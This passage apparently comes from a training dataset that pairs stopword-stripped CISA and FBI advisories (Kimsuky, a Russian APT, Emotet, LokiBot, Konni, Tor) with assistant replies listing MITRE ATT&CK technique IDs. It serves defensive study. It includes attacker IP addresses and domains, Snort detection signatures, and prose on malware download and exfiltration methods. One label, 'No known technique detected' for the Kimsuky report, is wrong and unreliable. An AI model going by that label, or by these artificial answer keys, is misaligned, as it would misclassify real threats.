information email malware victim machine encrypting data sending c2 server archive collected data kimsuky also sets autoforward rules within victims email account email collection email forwarding rule kimsuky also uses rc4 key generated md5 hash randomly generated 117bytes buffer exfiltrate stolen data data sent rsaencrypted encrypted channel symmetric cryptography kimsukys malware constructs 1120bit public key uses encrypt 117bytes buffer resulting data file saved cprogram filescommon filessystemole db data staged local data staging60 mitigations indicators compromise kimsuky used domains listed table 1 carry objectives downloadable copy iocs see aa20301astix table 1 domains used kimsuky table 2 redacted domains used kimsuky contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov disclaimer information provided informational purposes united states government provide warranties kind regarding information event shall united states government contractors subcontractors liable damages including limited direct indirect special consequential damages arising resulting way connected information whether based upon warranty contract tort otherwise whether arising negligence whether injury sustained arose results reliance upon information united states government endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government references1 netscout stolen pencil campaign targets academia2 cyware social babyshark malware continues target nuclear cryptocurrency industries3 cyware social babyshark malware continues target nuclear cryptocurrency industries4 netscout stolen pencil campaign targets academia5 mitre attck groups kimsuky6 securityweekcom north korean suspected cyberespionage attacks south korea entities7 mitre attck groups kimsuky8 crowdstrike 2020 global threat report9 malwarebytes apts covid19 advanced persistent threats use coronavirus lure10 pwc tracking kimsuky north koreabased cyber espionage group part 211 crowdstrike 2020 global threat report12 netscout stolen pencil campaign targets academia13 mitre attck groups kimsuky 14 private sector partner15 cyware social babyshark malware continues target nuclear cryptocurrency industries16 malwarebytes apts covid19 advanced persistent threats use coronavirus lure17 cyberscoop north korea could accelerate commercial espionage meet kims economic deadline18 mitre attck groups kimsuky19 cyware social babyshark malware continues target nuclear cryptocurrency industries20 mitre attck groups kimsuky21 palo alto networks unit 42 new babyshark malware targets us national security think tanks22 palo alto networks unit 42 new babyshark malware targets us national security think tanks23 cyware social babyshark malware continues target nuclear cryptocurrency industries24 mitre attck groups kimsuky25 palo alto networks unit 42 babyshark malware part two attacks continue using kimjongrat pcrat26 mcafee mshta used protect it27 palo alto networks unit 42 new babyshark malware targets us national security think tanks28 netscout stolen pencil campaign targets academia29 mitre attck groups kimsuky30 palo alto networks unit 42 new babyshark malware targets us national security think tanks31 netscout stolen pencil campaign targets academia32 securelist kimsuky operation north korean apt 33 private sector partner 34 private sector partner35 securelist kimsuky operation north korean apt36 yoroi north korean kimsuky apt keeps threatening south korea evolving ttps37 yoroi north korean kimsuky apt keeps threatening south korea evolving ttps38 securelist kimsuky operation north korean apt39 mitre attck groups kimsuky40 securelist kimsuky operation north korean apt41 securelist kimsuky operation north korean apt42 securelist kimsuky operation north korean apt43 mitre attck groups kimsuky44 mcafee mshta used protect it45 securityweekcom north korean suspected cyberespionage attacks south korea entities46 securelist kimsuky operation north korean apt47 mitre attck groups kimsuky48 detecting credential theft memory access modelling microsoft defender atp49 mitre attck groups kimsuky50 zdnet cyberespionagegroupuseschromeextensiontoinfectvictims51 zdnet cyberespionagegroupuseschromeextensiontoinfectvictims52 netscout stolen pencil campaign targets academia53 netscout stolen pencil campaign targets academia 54 private sector partner55 securelist kimsuky operation north korean apt56 securelist kimsuky operation north korean apt 57 private sector partner58 securelist kimsuky operation north korean apt 59 private sector partner60 securelist kimsuky operation north korean apt revisions october 27 2020 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary joint cybersecurity advisory uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise framework referenced threat actor tactics techniques joint cybersecurity advisorywritten federal bureau investigation fbi cybersecurity infrastructure security agency cisaprovides information russian statesponsored advanced persistent threat apt actor activity targeting various us state local territorial tribal sltt government networks well aviation networks advisory updates joint cisafbi cybersecurity advisory aa20283a apt actors chaining vulnerabilities sltt critical infrastructure elections organizations since least september 2020 russian statesponsored apt actorknown variously berserk bear energetic bear teamspy dragonfly havex crouching yeti koala opensource reportinghas conducted campaign wide variety us targets russian statesponsored apt actor targeted dozens sltt government aviation networks attempted intrusions several sltt organizations successfully compromised network infrastructure october 1 2020 exfiltrated data least two victim servers russiansponsored apt actor obtaining user administrator credentials establish initial access enable lateral movement inside network locate high value assets order exfiltrate data least one compromise apt actor laterally traversed sltt victim network accessed documents related sensitive network configurations passwords standard operating procedures sop enrolling multifactor authentication mfa instructions requesting password resets vendors purchasing information printing access badges date fbi cisa information indicate apt actor intentionally disrupted aviation education elections government operations however actor may seeking access obtain future disruption options influence us policies actions delegitimize sltt government entities recent malicious activity directed sltt government networks may risk elections information housed sltt government networks however fbi cisa evidence date integrity elections data compromised due heightened awareness surrounding elections infrastructure targeting sltt government networks fbi cisa continue monitor activity proximity elections infrastructure click pdf version report click stix package iocs us heat map activity click interactive heat map activity current november 17 2020 hovering cursor map reveals number type entities russian apt targeted region totals include compromises scanning reconnaissance activity executed russian apt actor infrastructure note cisa committed providing access web pages documents individuals disabilities members public federal employees format elements content within document interferes ability access information defined rehabilitation act please email infouscertgov enable us respond manner helpful please indicate nature accessibility problem preferred format receive material note heat map interactive features may work web browser best use please download save catalog technical details fbi cisa observed russian statesponsored apt actor activity targeting us sltt government networks well aviation networks apt actor using turkish ip addresses 2137410165 21374139196 21225230170 connect victim web servers exploit public facing application actor using 2137410165 21374139196 attempt brute force logins several instances attempted structured query language sql injections victim websites brute force exploit public facing application apt actor also hosted malicious domains including possible aviation sector target columbusairportsmicrosoftonlinehost resolved 10817723592 andcitynamewestus2cloudappazurecom domains us registered likely sltt government targets driveby compromise apt actor scanned vulnerable citrix microsoft exchange services identified vulnerable systems likely future exploitation actor continues exploit citrix directory traversal bug cve201919781 microsoft exchange remote code execution flaw cve20200688 apt actor observed using cisco anyconnect secure socket layer ssl virtual private network vpn connections enable remote logins least one victim network possibly enabled exim simple mail transfer protocol smtp vulnerability cve 201910149 external remote services recently apt actor enumerated exploited fortinet vpn vulnerability cve201813379 initial access windows netlogon vulnerability cve20201472 obtain access windows active directory ad servers privilege escalation within network valid accounts vulnerabilities also leveraged compromise devices network lateral movement maintain persistence early february midseptember apt actors used 2137410165 21225230170 5196167184 37139716 149562055 912276897 545119124 target us sltt government networks successful authenticationsincluding compromise microsoft office 365 o365 accountshave observed least one victim network valid accounts mitigations indicators compromise apt actor used following ip addresses domains carry objectives 2137410165 21374139196 21225230170 5196167184 37139716 149562055 912276897 13820118643 545119124 1933721243 14607760 5115928101 columbusairportsmicrosoftonlinehost microsoftonlinehost emailmicrosoftonlineservices microsoftonlineservices citynamewestus2cloudappazurecom ip address 5115928101 appears configured receive stolen windows new technology local area network manager ntlm credentials fbi cisa recommend organizations take defensive actions mitigate risk leaking ntlm credentials specifically organizations disable ntlm restrict outgoing ntlm organizations consider blocking ip address 5115928101 although action alone may mitigate threat apt actor likely established establish additional infrastructure points organizations check available logs traffic tofrom ip address 5115928101 indications credentialharvesting activity apt actors likely haveor willestablish additional infrastructure points organizations also monitor server message block smb webdav activity leaving network ip addresses refer aa20296astix downloadable copy iocs network defenseindepth proper network defenseindepth adherence information security best practices assist mitigating threat reducing risk critical infrastructure following guidance may assist organizations developing network defense procedures keep applications updated according vendor recommendations especially prioritize updates external facing applications remote access services address cve201919781 cve20200688 cve 201910149 cve201813379 cve20201472 refer table 1 patch information cves table 1 patch information cves follow microsofts guidance monitoring logs activity related netlogon vulnerability cve20201472 appropriate organizations network prevent external communication versions smb related protocols network boundary blocking transmission control protocol tcp ports 139 445 user datagram protocol udp port 137 see cisa publication smb security best practices information implement prevention detection mitigation strategies outlined cisa alert ta15314a compromised web servers web shells threat awareness guidance national security agency cybersecurity information sheet uoo13409420 detect prevent web shells malware isolate external facing services network demilitarized zone dmz since exposed malicious activity enable robust logging monitor logs signs compromise establish training mechanism inform end users proper email web usage highlighting current information analysis including common indicators phishing end users clear instructions report unusual suspicious emails implement application controls allow execution specified application directories system administrators may implement microsoft software restriction policy applocker similar software safe defaults allow applications run programfiles programfilesx86 windows folders locations disallowed unless exception granted block remote desktop protocol rdp connections originating untrusted external addresses unless exception exists routinely review exceptions regular basis validity comprehensive account resets accounts ntlm password hashes kerberos tickets may compromised eg cve20201472 doublepasswordreset may required order prevent continued exploitation accounts domainadminlevel credentials reset krbtgt golden tickets may required microsoft released specialized guidance reset performed carefully needed observation cve20201472 netlogon activity indications valid credential abuse assumed apt actors compromised ad administrative accounts cases ad forest fully trusted therefore new forest deployed existing hosts old compromised forest migrated without rebuilt rejoined new domain migration may done creative destruction wherein endpoints legacy forest decommissioned new ones built new forest need completed onpremiseas well azurehostedad instances note fully resetting ad forest difficult complex best done assistance personnel successfully completed task previously critical perform full password reset user computer accounts ad forest use following steps guide create temporary administrator account use account administrative actions reset kerberos ticket granting ticket krbtgt password1 must completed additional actions second reset take place step 5 wait krbtgt reset propagate domain controllers time may vary reset account passwords passwords 15 characters randomly assigned user accounts forced reset legacy password reuse local accounts hosts including local accounts covered local administrator password solutionlaps service accounts directory services restore mode dsrm account domain controller machine account application passwords reset krbtgt password wait krbtgt reset propagate domain controllers time may vary reboot domain controllers reboot endpoints following accounts reset ad kerberos authentication master 2x active directory accounts active directory admin accounts active directory service accounts active directory user accounts dsrm account domain controllers nonad privileged application accounts nonad unprivileged application accounts nonwindows privileged accounts nonwindows user accounts windows computer accounts windows local admin vpn vulnerabilities implement following recommendations secure organizations vpns update vpns network infrastructure devices devices used remote work environments latest software patches security configurations see cisa tips understanding patches software updates securing network infrastructure devices wherever possible enable automatic updates implement mfa vpn connections increase security physical security tokens secure form mfa followed authenticator appbased mfa sms emailbased mfa used forms available mfa implemented require teleworkers use strong passwords see cisa tips choosing protecting passwords supplementing passwords information discontinue unused vpn servers reduce organizations attack surface discontinuing unused vpn servers may act point entry attackers protect organization vpn vulnerabilities audit configuration patch management programs monitor network traffic unexpected unapproved protocols especially outbound internet eg secure shellssh smb rdp implement mfa especially privileged accounts use separate administrative accounts separate administration workstations keep software date enable automatic updates available contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov resources apt actors chaining vulnerabilities sltt critical infrastructure elections organizations httpsuscertcisagovncasalertsaa20283a cisa activity alert cve201919781 httpsuscertcisagovncasalertsaa20031a cisa vulnerability bulletin httpsuscertcisagovncasbulletinssb19161 cisa current activity httpsuscertcisagovncascurrentactivity20200310unpatchedmicrosoftexchangeserversvulnerablecve20200688 citrix directory traversal bug cve201919781 httpsnvdnistgovvulndetailcve201919781 microsoft exchange remote code execution flaw cve20200688 httpsnvdnistgovvulndetailcve20200688 cve201813379 httpsnvdnistgovvulndetailcve201813379 cve20201472 httpsnvdnistgovvulndetailcve20201472 cve 201910149 httpsnvdnistgovvulndetailcve201910149 nccicuscert alert ta15314a compromised web servers web shells threat awareness guidance httpsuscertcisagovncasalertsta15314a nccicuscert publication smb security best practices httpsuscertcisagovncascurrentactivity20170116smbsecuritybestpractices disclaimer information provided informational purposes united states government provide warranties kind regarding information event shall united states government contractors subcontractors liable damages including limited direct indirect special consequential damages arising resulting way connected information whether based upon warranty contract tort otherwise whether arising negligence whether injury sustained arose results reliance upon information united states government endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government references1 microsoft ad forest recovery resetting krbtgt password revisions october 22 2020 initial versionnovember 17 2020 added us heat map activitydecember 1 2020 added current date us heat map activity product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078, T1110, T1133, T1189, T1190"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary alert uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise framework referenced threat actor techniques product written cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac emoteta sophisticated trojan commonly functioning downloader dropper malwareresurged july 2020 dormant period began february since august cisa msisac seen significant increase malicious cyber actors targeting state local governments emotet phishing emails increase rendered emotet one prevalent ongoing threats secure emotet cisa msisac recommend implementing mitigation measures described alert include applying protocols block suspicious attachments using antivirus software blocking suspicious ips technical details emotet advanced trojan primarily spread via phishing email attachments links clicked launch payload phishing spearphishing attachment phishing spearphishing linkthe malware attempts proliferate within network brute forcing user credentials writing shared drives brute force password guessing valid accounts local accounts remote services smbwindows admin shares emotet difficult combat wormlike features enable networkwide infections additionally emotet uses modular dynamic link libraries continuously evolve update capabilities since july 2020 cisa seen increased activity involving emotetassociated indicators time cisas einstein intrusion detection system protects federal civilian executive branch networks detected roughly 16000 alerts related emotet activity cisa observed emotet executed phases possible targeted campaigns emotet used compromised word documents doc attached phishing emails initial insertion vectors possible command control network traffic involved http post requests uniform resource identifiers consisting nonsensical random length alphabetical directories known emotetrelated domains ips following user agent string application layer protocol web protocols mozilla40 compatible msie 70 windows nt 61 wow64 trident70 slcc2 net clr 2050727 net clr 3530729 net clr 3030729 media center pc 60 net40c net40e infopath3 net clr traffic known emotetrelated domains ips occurred commonly ports 80 8080 443 one instance traffic emotetrelated ip attempted connect suspected compromised site port 445 possibly indicating use server message block exploitation frameworks along emotet exploitation remote services figure 1 lays emotets use enterprise techniques figure 1 mitre attck enterprise techniques used emotet timeline activity following timeline identifies key emotet activity observed 2020 february cybercriminals targeted nonus countries using covid19themed phishing emails lure victims download emotet1 july researchers spotted emails previously used emotet urls particularly used february campaign targeting us businesses covid19themed lures2 august security researchers observed 1000 percent increase downloads emotet loader following change antivirus software firms adjusted detection heuristics compensate leading decreases observed loader downloads3 proofpoint researchers noted mostly minimal changes tactics tools previously used emotet significant changes included emotet delivering qbot affiliate partner01 primary payload emotet mail sending modules ability deliver benign malicious attachments4 cisa msisac observed increased attacks united states particularly cyber actors using emotet target state local governments september cyber agencies researchers alerted public surges emotet including compromises canada france japan new zealand italy netherlands emotet botnets observed dropping trickbot deliver ransomware payloads victims qakbot trojans steal banking credentials data targets5678 security researchers microsoft identified pivot tactics emotet campaign new tactics include attaching passwordprotected archive files eg zip files emails bypass email security gateways email messages purport deliver documents created mobile devices lure targeted users enabling macros view documentsan action actually enables delivery malware9 palo alto networks reported cyber actors using thread hijacking spread emotet attack technique involves stealing existing email chain infected host reply chainusing spoofed identityand attaching malicious document trick recipients opening file10 mitre attck techniques according mitre emotet uses attck techniques listed table 1 table 1 common exploit tools detection signatures msisac developed following snort signature use detecting network activity associated emotet activity alert tcp homenet externalnet 443 msgcis emotet c2 traffic using form data send passwords contentpost httpmethod contentcontenttype3a 20multipartformdata3b 20boundary httpheader fastpattern contentcontentdisposition3a 20formdata3b 20name22 httpclientbody contentwebkitformboundary httpclientbody contentcookie3a pcrechromefirefoxsafarioperaieedge passwordsi referenceurlcofensecomflashbulletinemotetepoch1changesc2communication sid1 rev2 cisa developed following snort signatures use detecting network activity associated emotet activity note uniform resource identifiers contain random length alphabetical multiple directory string activity likely ports 80 8080 443 alert tcp httpports msgemotethttp uri get contains wpcontent sid00000000 rev1 flowestablishedtoserver contentwpcontent httpuri content httpuri distance0 within4 contentget nocase httpmethod urilen17 classtypehttpuri contentconnection3a 20keepalive0d 0a httpheader metadataservice http alert tcp httpports msgemotethttp uri get contains wpadmin sid00000000 rev1 flowestablishedtoserver contentwpadmin httpuri content httpuri distance0 within4 contentget nocase httpmethod urilen15 contentconnection3a 20keepalive0d 0a httpheader classtypehttpuri metadataservice http mitigations cisa msisac recommend network defendersin federal state local tribal territorial governments private sectorconsider applying following best practices strengthen security posture organizations systems system owners administrators review configuration changes prior implementation avoid unwanted impacts block email attachments commonly associated malware egdll exe block email attachments scanned antivirus software egzip files implement group policy object firewall rules implement antivirus program formalized patch management process implement filters email gateway block suspicious ip addresses firewall adhere principle least privilege implement domainbased message authentication reporting conformance validation system segment segregate networks functions limit unnecessary lateral communications disable file printer sharing services services required use strong passwords active directory authentication enforce multifactor authentication exercise caution opening email attachments even attachment expected sender appears known see using caution email attachments enable firewall agency workstations configured deny unsolicited connection requests disable unnecessary services agency workstations servers scan remove suspicious email attachments ensure scanned attachment true file type ie extension matches file header monitor users web browsing habits restrict access suspicious risky sites exercise caution using removable media eg usb thumb drives external drives cds scan software downloaded internet prior executing maintain situational awareness latest threats implement appropriate access control lists visit mitre attck techniques pages linked table 1 additional mitigation detection strategies see cisas alert technical approaches uncovering remediating malicious activity information addressing potential incidents applying best practice incident response procedures see joint cisa msisac ransomware guide proactive prevent ransomware attacks happening detailed approach respond attack best resolve cyber incident additional information malware incident prevention handling see national institute standards technology special publication 80083 guide malware incident prevention handling desktops laptops resources msisac security event primer emotet cisa alert ta18201a emotet malware mitre attck emotet mitre attck enterprise references1 bleeping computer emotet malware strikes us businesses covid19 spam2 ibid3 security lab emotet update increases downloads4 proofpoint comprehensive look emotets summer 2020 return5 zdnet france japan new zealand warn sudden strike emotet attacks6 bleeping computer france warns emotet attacking companies administration7 eset emotet strikes quebecs department justice eset analysis8 zdnet microsoft italy netherlands warn increased emotet activity9 bleeping computer emotet double blunder fake windows 10 mobile outdated messages10 palo alto networks case study emotet thread hijacking email attack technique revisions october 6 2020 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1021.002, T1027, T1027.002, T1040, T1041, T1047, T1053.005, T1055.001, T1057, T1059.001, T1059.003, T1059.005, T1071.001, T1087.003, T1110.001, T1204.001, T1204.002, T1210, T1543.003, T1547.001, T1552.001, T1555.003, T1560, T1566.001, T1566.002, T1571, T1573.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary alert uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise frameworks referenced threat actor techniques product written cybersecurity infrastructure security agency cisa contributions multistate information sharing analysis center msisac cisa observed notable increase use lokibot malware malicious cyber actors since july 2020 throughout period cisas einstein intrusion detection system protects federal civilian executive branch networks detected persistent malicious lokibot activity lokibot uses credential informationstealing malware often sent malicious attachment known simple yet effective making attractive tool broad range cyber actors across wide variety data compromise use cases technical details lokibotalso known lokibot loki pws lokibotemploys trojan malware steal sensitive information usernames passwords cryptocurrency wallets credentials malware steals credentials use keylogger monitor browser desktop activity credentials password stores credentials password stores credentials web browsers input capture keylogging lokibot also create backdoor infected systems allow attacker install additional payloads event triggered execution accessibility features malicious cyber actors typically use lokibot target windows android operating systems distribute malware via email malicious websites text private messages user execution malicious file see figure 1 enterprise techniques used lokibot figure 1 mitre attck enterprise techniques used lokibot since lokibot first reported 2015 cyber actors used across range targeted applications including following february 2020 trend micro identified cyber actors using lokibot impersonate launcher fortnitea popular video game1 august 2019 fortiguard se researchers discovered malspam campaign distributing lokibot informationstealing payloads spearphishing attack us manufacturing company2 august 2019 trend micro researchers reported lokibot malware source code hidden image files spread attachments phishing emails3 june 2019 netskope uncovered lokibot distributed malspam campaign using iso image file attachments4 april 2019 netskope uncovered phishing campaign using malicious email attachments lokibot malware create backdoors onto infected windows systems steal sensitive information5 february 2018 trend micro discovered cve201711882 exploited attack using windows installer service deliver lokibot malware6 october 2017 sfylabs identified cyber actors using lokibot android banking trojan turns ransomware7 may 2017 fortinet reported malicious actors using pdf file spread new lokibot variant capable stealing credentials 100 different software tools8 march 2017 check point discovered lokibot malware found preinstalled android devices9 december 2016 drweb researchers identified new lokibot variant targeting android core libraries10 february 2016 researchers discovered lokibot android trojan infecting core android operating system processes11 mitre attck techniques according mitre lokibot uses attck techniques listed table 1 table 1 lokibot attck techniques detection signatures cisa developed following snort signature use detecting network activity associated lokibot activity alert tcp httpports msglokibothttp uri post contains frephp postinfection flowestablishedtoserver flowbitsisnotsettagged contentfrephp httpuri fastpatternonly urilen50norm contentpost nocase httpmethod pcrealienlokyddonepjemplokeynew2lokicharlessev7ndbworkscrollnwwrkjobfiveddonemyanimationdkclovemaskyvdlifetnbenfrephpiu flowbitssettaggedclasstypehttpuri metadataservice http metadatapattern httpp001 mitigations cisa msisac recommend federal state local tribal territorial government private sector users network administrators consider applying following best practices strengthen security posture organizations systems system owners administrators review configuration changes prior implementation avoid unwanted impacts maintain uptodate antivirus signatures engines see protecting malicious code keep operating system patches date see understanding patches software updates disable file printer sharing services services required use strong passwords active directory authentication enforce multifactor authentication see supplementing passwords information restrict users ability permissions install run unwanted software applications add users local administrators group unless required enforce strong password policy see choosing protecting passwords exercise caution opening email attachments even attachment expected sender appears known see using caution email attachments enable personal firewall agency workstations configured deny unsolicited connection requests disable unnecessary services agency workstations servers scan remove suspicious email attachments ensure scanned attachment true file type ie extension matches file header monitor users web browsing habits restrict access sites unfavorable content exercise caution using removable media eg usb thumb drives external drives cds scan software downloaded internet prior executing maintain situational awareness latest threats implement appropriate access control lists visit mitre attck techniques pages linked table 1 additional mitigation detection strategies additional information malware incident prevention handling see national institute standards technology special publication 80083 guide malware incident prevention handling desktops laptops resources center internet security security event primer malware httpswwwcisecurityorgwhitepaperssecurityeventprimermalware mitre attck lokibot httpsattackmitreorgsoftwares0447 mitre attck enterprise httpsattackmitreorgmatricesenterprise references1 trend micro lokibot impersonates popular game launcher drops compiled c code file2 fortinet newly discovered infostealer attack uses lokibot3 zdnet lokibot malware hides source code image files4 securityweek lokibot nanocore malware distributed iso image files5 netskope lokibot nanocore distributed via iso disk image files6 trend micro attack using windows installer leads lokibot7 bleepingcomputer lokibot android banking trojan turns ransomware try remove it8 fortinet new loki variant spread via pdf file9 check point preinstalled malware targeting mobile users10 bleepingcomputer loki trojan infects android libraries system process get root privileges11new jersey cybersecurity communications integration celllokibot revisions september 22 2020 initial versionseptember 23 2020 added hyperlink msisac product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016, T1027, T1027.002, T1033, T1041, T1055.012, T1056.001, T1071.001, T1082, T1204.002, T1555, T1555.003, T1564.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary alert uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise framework referenced threat actor techniques cybersecurity infrastructure security agency cisa observed cyber actors using emails containing microsoft word document malicious visual basic application vba macro code deploy konni malware konni remote administration tool rat used malicious cyber actors steal files capture keystrokes take screenshots execute arbitrary code infected hosts technical details konni malware often delivered via phishing emails microsoft word document malicious vba macro code phishing spearphising attachment malicious code change font color light grey black fool user enable content check windows operating system 32bit 64bit version construct execute command line download additional files command scripting interpreter windows command shell vba macro constructs command line uses certificate database tool certutil download remote files given uniform resource locator also incorporates builtin function decode base64encoded files command prompt silently copies certutilexe temp directory renames evade detection cyber actor downloads text file remote resource containing base64encoded string decoded certutil saved batch bat file finally cyber actor deletes text file temp directory executes bat file mitre attck techniques according mitre konni uses attck techniques listed table 1 table 1 konni attck techniques detection signatures cisa developed following snort signatures use detecting konni malware exploits alert tcp httpports msghttp uri contains wegetphp konni sid1 rev1 flowestablishedtoserver contentweget httpuri depth7 offset0 fastpattern contentphp httpuri distance0 within12 contentreferrer3a 20 httpheader classtypehttpuri priority2 metadataservice http alert tcp httpports msgkonnihttp header contains useragent3a 20http0d 0a sid1 rev1 flowestablishedtoserver contentuseragent3a 20http0d 0a httpheader fastpatternonly contentpost nocase httpmethod classtypehttpheader priority2 metadataservice http alert tcp httpports msgkonnihttp uri contains wegetuploaduploadtmdownload sid1 rev1 flowestablishedtoserver contentweget httpuri fastpatternonly pcrewegetx2fuploaduploadtmdownloadphpiu contentpost httpmethod classtypehttpuri priority2 referenceurlblogtalosintelligencecom201707konnireferencesnorthkoreanmissilecapabilitieshtml metadataservice http mitigations cisa recommends users administrators consider using following best practices strengthen security posture organizations systems configuration changes reviewed system owners administrators prior implementation avoid unwanted impacts maintain uptodate antivirus signatures engines see protecting malicious code keep operating system patches date see understanding patches software updates disable file printer sharing services services required use strong passwords active directory authentication restrict users ability permissions install run unwanted software applications add users local administrators group unless required enforce strong password policy see choosing protecting passwords exercise caution opening email attachments even attachment expected sender appears known see using caution email attachments enable personal firewall agency workstations configured deny unsolicited connection requests disable unnecessary services agency workstations servers scan remove suspicious email attachments ensure scanned attachment true file type ie extension matches file header monitor users web browsing habits restrict access sites unfavorable content exercise caution using removable media eg usb thumb drives external drives cds scan software downloaded internet prior executing maintain situational awareness latest threats implement appropriate access control lists visit mitre attck techniques pages linked table 1 additional mitigation detection strategies additional information malware incident prevention handling see national institute standards technology special publication 80083 guide malware incident prevention handling desktops laptops resources dhunter look konni 2019 campaign mitre attck konni mitre attck enterprise revisions august 14 2020 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016, T1033, T1036.005, T1056.001, T1057, T1059.001, T1059.003, T1070.004, T1071.001, T1082, T1083, T1105, T1112, T1113, T1115, T1132.001, T1140, T1218.011, T1547.001, T1547.009, T1548.002, T1555.003, T1566.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck preattck framework see attck enterprise preattck frameworks referenced threat actor techniques advisorywritten cybersecurity security infrastructure security agency cisa contributions federal bureau investigation fbihighlights risks associated tor along technical details recommendations mitigation cyber threat actors use tor software network infrastructure anonymity obfuscation purposes clandestinely conduct malicious cyber operations123 tor aka onion router software allows users browse web anonymously encrypting routing requests multiple relay layers nodes software maintained tor project nonprofit organization provides internet anonymity anticensorship tools tor used promote democracy free anonymous use internet also provides avenue malicious actors conceal activity identity point origin determined tor software user using onion routing protocol tor software obfuscates users identity anyone seeking monitor online activity eg nation states surveillance organizations information security tools possible online activity someone using tor software appears originate internet protocol ip address tor exit node opposed ip address users computer cisa fbi recommend organizations assess individual risk compromise via tor take appropriate mitigations block closely monitor inbound outbound traffic known tor nodes click pdf version report risk evaluation malicious cyber actors use tor mask identity engaging malicious cyber activity impacting confidentiality integrity availability organizations information systems data examples activity include performing reconnaissance penetrating systems exfiltrating manipulating data taking services offline denialofservice attacks delivery ransomware payloads threat actors relayed command control c2 server communicationsused control systems infected malwarethrough tor obscuring identity location ownership servers use tor context allows threat actors remain anonymous making difficult network defenders authorities perform system recovery respond cyberattacks organizations take steps block monitor tor traffic heightened risk targeted exploited threat actors hiding identity intentions using tor risk target malicious activity routed tor unique organization organization determine individual risk assessing likelihood threat actor target systems data probability threat actors success given current mitigations controls assessment consider legitimate reasons nonmalicious users may prefer need use tor accessing network organizations evaluate mitigation decisions threats organization advanced persistent threats apts moderately sophisticated attackers lowskilled individual hackers leveraged tor carry reconnaissance attacks past technical details tor obfuscates source destination web request allows users conceal information activities websuch location network usagefrom recipients traffic well third parties may conduct network surveillance traffic analysis tor encrypts users traffic routes traffic least three tor nodes relays users starting ip address request masked network traffic observers transit request reaches intended destination exits tor public tor exit node anyone conducting monitoring analysis see traffic coming tor exit node able determine original ip address request figure 1 malicious tactics techniques aided tor mapped mitre attck framework malicious tactics techniques aided tor threat actors use tor create layer anonymity conceal malicious activity different stages network compromise tactics techniquesillustrated figure 1 aboveinclude preattck target selection technical information gathering conduct active scanning conduct passive scanning determine domain ip address space identify security defensive capabilities technical weakness identification attck initial access exploit publicfacing applications command control commonly used port connection proxy custom command control protocol custom cryptographic protocol multihop proxy multilayer encryption standard application layer protocol exfiltration impact data encrypted impact endpoint denial service network denial service key indicators malicious activity via tor tor obfuscates user identified standard security tools network defenders leverage various network endpoint security appliance logs detect use tor including potentially malicious activity involving tor indicator behaviorbased analysis using indicatorbased approach network defenders leverage security information event management siem tools log analysis platforms flag suspicious activities involving ip addresses tor exit nodes list tor exit node ip addresses actively maintained tor projects exit list service offers realtime query bulk download interfaces see httpsblogtorprojectorgchangestorexitlistservice organizations preferring bulk download may consider automated data ingest solutions given highly dynamic nature tor exit list updated hourly network defenders closely inspect evidence substantial transactions tor exit nodesrevealed netflow packet capture pcap web server logsto infer context activity discern malicious behavior could represent reconnaissance exploitation c2 data exfiltration using behaviorbased approach network defenders uncover suspicious tor activity searching operational patterns tor client software protocols transmission control protocol tcp user datagram protocol udp ports commonly affiliated tor include 9001 9030 9040 9050 9051 9150 highly structured domain name service dns queries domain names ending suffix torprojectorg another behavior exhibited hosts running tor software addition dns queries domains ending onion behavior exhibited misconfigured tor clients may attempting beacon malicious tor hidden services organizations research enable preexisting tor detection mitigation capabilities within existing endpoint network security solutions often employ effective detection logic solutions web application firewalls router firewalls hostnetwork intrusion detection systems may already provide level tor detection capability mitigations organizations implement mitigations varying complexity restrictiveness reduce risk posed threat actors use tor carry malicious activities however mitigation actions also impact access legitimate users leverage tor protect privacy visiting organizations internetfacing assets organizations evaluate probable risk available resources impact legitimate nonmalicious tor users applying mitigation actions restrictive approach block web traffic public tor entry exit nodes organizations wish take conservative less resourceintensive approach reduce risk posed threat actors use tor implement tools restrict trafficmalicious legitimateto tor entry exit nodes note blocking known tor nodes completely eliminate threat malicious actors using tor anonymity additional tor network access points bridges listed publicly see table 1 restrictive mitigation practices less restrictive approach tailor monitoring analysis blocking web traffic public tor entry exit nodes instances legitimate users may leverage tor internet browsing nonmalicious purposes example deployed military overseas voters may use tor part voting process escape 